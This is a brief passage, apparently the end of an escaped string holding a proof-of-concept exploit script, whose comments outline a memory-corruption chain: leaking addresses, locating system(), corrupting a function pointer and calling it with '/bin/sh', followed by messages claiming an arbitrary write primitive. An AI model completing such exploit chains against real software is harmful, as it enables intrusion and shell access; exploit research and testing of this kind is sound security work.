real exploit, we would:\n    // 1. Leak addresses using similar technique\n    // 2. Find system() address\n    // 3. Corrupt a function pointer to point to system()\n    // 4. Call the function with \"/bin/sh\" argument\n    \n    print(\"Arbitrary write primitive achieved!\");\n    print(\"Next steps would be to leak libc addresses and call system('/bin/sh')\");\n}\n\nprint(\"PoC completed\");"})
